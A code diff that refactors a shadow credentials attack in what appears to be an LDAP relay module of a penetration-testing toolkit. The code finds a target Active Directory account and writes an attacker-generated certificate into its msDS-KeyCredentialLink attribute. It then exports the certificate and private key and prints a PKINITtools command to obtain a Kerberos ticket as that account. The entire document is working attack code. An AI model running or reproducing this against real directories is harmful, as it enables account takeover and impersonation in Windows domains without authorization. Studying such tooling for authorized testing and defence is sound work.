@@ -183,9 +183,9 @@ class LDAPAttack(ProtocolAttack):
     def __init__(self, config, LDAPClient, username, root_dn, args=None):
         if args:
             self.principalidentity_dn = args.principalidentity_dn
-            self.principalidentity_sid = args.principalidentity_sid
+            self.principalidentity_sid = format_sid(args.principalidentity_sid)
             self.targetidentity_dn = args.targetidentity_dn
-            self.targetidentity_sid = args.targetidentity_sid
+            self.targetidentity_sid = format_sid(args.targetidentity_sid)
             self.args = args
 
         self.rootDN = root_dn
@@ -280,33 +280,27 @@ class LDAPAttack(ProtocolAttack):
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
 
 
-    def shadowCredentialsAttack(self, domainDumper):
-        currentShadowCredentialsTarget = self.config.ShadowCredentialsTarget
-        # If the target is not specify, we try to modify the user himself
-        if not currentShadowCredentialsTarget:
-            currentShadowCredentialsTarget = self.username
-
-        if currentShadowCredentialsTarget in delegatePerformed:
-            LOG.info('Shadow credentials attack already performed for %s, skipping' % currentShadowCredentialsTarget)
-            return
-
+    def shadowCredentialsAttack(self, ShadowCredentialsExportType="PFX"):
         LOG.info("Searching for the target account")
 
         # Get the domain we are in
-        domaindn = domainDumper.root
+        domaindn = self.rootDN
         domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
 
         # Get target computer DN
-        result = self.getUserInfo(domainDumper, currentShadowCredentialsTarget)
-        if not result:
+        self.client.search(self.rootDN, f'(distinguishedName={self.targetidentity_dn})', attributes=['objectSid','sAMAccountName'])
+        result = self.client.entries
+        #result = self.getUserInfo(self.targetidentity_dn)
+        if len(result) == 0:
             LOG.error('Target account does not exist! (wrong domain?)')
             return
         else:
-            target_dn = result[0]
+            target_dn = result[0].entry_dn
+            target_sid = result[0]['objectSid'].values[0]
             LOG.info("Target user found: %s" % target_dn)
 
         LOG.info("Generating certificate")
-        certificate = X509Certificate2(subject=currentShadowCredentialsTarget, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+        certificate = X509Certificate2(subject=target_sid, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
         LOG.info("Certificate generated")
         LOG.info("Generating KeyCredential")
         keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
@@ -323,35 +317,28 @@ class LDAPAttack(ProtocolAttack):
             return
         try:
             new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
-            LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
+            LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.targetidentity_dn)
             self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
                 LOG.info("Updated the msDS-KeyCredentialLink attribute of the target object")
-                if self.config.ShadowCredentialsOutfilePath is None:
-                    path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
-                    LOG.debug("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
-                else:
-                    path = self.config.ShadowCredentialsOutfilePath
-                if self.config.ShadowCredentialsExportType == "PEM":
+                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+                LOG.debug("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
+                if ShadowCredentialsExportType == "PEM":
                     certificate.ExportPEM(path_to_files=path)
                     LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
                     LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
                     LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     LOG.info("Run the following command to obtain a TGT")
-                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, currentShadowCredentialsTarget, path))
-                elif self.config.ShadowCredentialsExportType == "PFX":
-                    if self.config.ShadowCredentialsPFXPassword is None:
-                        password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
-                        LOG.debug("No pass was provided. The certificate will be store with the password: %s" % password)
-                    else:
-                        password = self.config.ShadowCredentialsPFXPassword
+                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, self.targetidentity_dn, path))
+                elif ShadowCredentialsExportType == "PFX":
+                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+                    LOG.debug("The certificate will be store with the password: %s" % password)
                     certificate.ExportPFX(password=password, path_to_file=path)
                     LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                     LOG.info("Must be used with password: %s" % password)
                     LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     LOG.info("Run the following command to obtain a TGT")
-                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, currentShadowCredentialsTarget, path))
-                    delegatePerformed.append(currentShadowCredentialsTarget)
+                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, self.targetidentity_dn, path))
             else:
                 if self.client.result['result'] == 50:
                     LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
@@ -569,11 +556,11 @@ class LDAPAttack(ProtocolAttack):
                 break
         return (usersid, privs)
 
-    def getUserInfo(self, domainDumper, samname):
-        entries = self.client.search(domainDumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
+    def getUserInfo(self, samname):
+        entries = self.client.search(self.rootDN, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
         try:
             dn = self.client.entries[0].entry_dn
-            sid = self.client.entries[0]['objectSid']
+            sid = format_sid(self.client.entries[0]['objectSid'])
             return (dn, sid)
         except IndexError:
             LOG.error('User not found in LDAP: %s' % samname)
